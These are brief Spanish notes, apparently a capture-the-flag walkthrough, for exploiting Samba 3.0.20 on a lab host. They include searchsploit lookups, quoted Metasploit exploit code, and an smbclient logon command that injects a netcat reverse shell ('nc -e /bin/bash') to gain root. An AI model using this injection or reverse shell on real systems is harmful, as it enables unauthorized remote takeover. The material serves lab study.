smb samba
Despues de escanear y descubrir el puerto abierto la version es vulnerable, buscamos con 
```
searchsploit vsftpd 2.3.4
```

al encontralo copiamos es path que se encuentra del lado derecho y lo pegamos para traer el sploit a la carpeta en este caso es :

```
searchsploit -m unix/remote/49757.py
```

No funciono, entonces probar con samba:
``` searchsploit Samba 3.0.20```

lo copiamos a nuestro directorio
```searchsploit -m unix/remote/16320.rb```

Veo que utiliza lo siguiente para explocat el recurso:
```def exploit
                connect
                # lol?
                username = "/=`nohup " + payload.encoded + "`"
                begin
                       simple.client.negotiate(false)
                       simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
                rescue ::Timeout::Error, XCEPT::LoginError
                        # nothing, it either worked or it didn't ;)
                end
```

Entonces se utiliza el siguiente formato para explotarlo:

Este para ver los recursos disponibles:
```smbclient -L //IP_name -U ```
Para entrar a por ejemplo /tmp 
```smbclient  //10.10.10.3/tmp```

Para obtener root bash 
logon "/=`nohup nc -e /bin/bash IP 443`"
    logon "/=`nohup nc -e /bin/bash 10.10.14.9 443`"

Luego ejecuto esto para tener consola interactiva: 
```script /dev/null -c bash```

Y ya con eso deberia de quedar, si quisiera una consola mejorada ver 
[consola interactiva](:/3f6beb89628c4ae482f2bbd324840dc9)

Para buscar las root simplemente
```find / -name root.txt | xargs cat```

